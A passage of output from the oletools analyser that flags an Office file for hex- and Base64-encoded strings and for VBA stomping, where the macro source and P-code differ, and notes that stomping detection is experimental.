|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

